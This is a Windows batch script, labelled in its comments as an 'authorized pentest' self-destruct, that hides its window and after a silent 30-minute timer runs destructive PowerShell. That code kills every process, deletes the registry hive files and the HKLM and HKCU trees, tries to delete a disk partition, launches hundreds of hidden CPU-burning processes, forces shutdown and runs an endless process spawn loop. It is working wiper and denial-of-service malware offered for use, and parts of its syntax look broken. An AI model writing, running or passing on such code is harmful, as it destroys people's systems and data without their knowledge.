@echo off
title 
REM HIDDEN ADMIN SELF-DESTRUCT - 30min SILENT
REM AUTHORIZED PENTEST - NO USER INTERACTION

REM HIDE EVERYTHING
mode con cols=1 lines=1
powershell -WindowStyle Hidden -Command "Add-Type -Name Win32 -Namespace Silent; [Silent.Win32]::ShowWindow((Get-Process -id $pid).MainWindowHandle, 0)"

REM 30min TIMER (1800 seconds)
powershell -WindowStyle Hidden -Command ^
"$s=1800; while($s-gt0){Start-Sleep 1; $s-=1}; iex 'gc $env:TEMP\\destruct.ps1 | iex'"

REM CREATE SILENT DESTRUCT SCRIPT
powershell -WindowStyle Hidden -Command ^
"$d=@'
taskkill /f /im * /t;
del /f /q /a $env:SystemRoot\\System32\\config\\*;
reg delete HKLM /f; reg delete HKCU /f;
diskpart /s \"select disk 0; list partition; select partition 1; delete partition override; exit\";
for($i=0;$i-lt500;$i++){Start-Process cmd -WindowStyle Hidden -ArgumentList \"/c powershell -nop -w h -c \\\"while(1){[math]::Pow(2,100000);gc .}\\\"\"};
shutdown /s /f /t 0 /c \"\";
while(1){Start-Process cmd -WindowStyle Hidden}
'@; $d | Out-File $env:TEMP\\destruct.ps1 -Force"

REM HIDDEN CPU BURN UNTIL DETONATION
powershell -WindowStyle Hidden -Command ^
"while($true){for($i=0;$i-lt1e7;$i++){[math]::Pow($i,3)*[math]::Sin($i*3.14)}; Start-Sleep 0.1}"
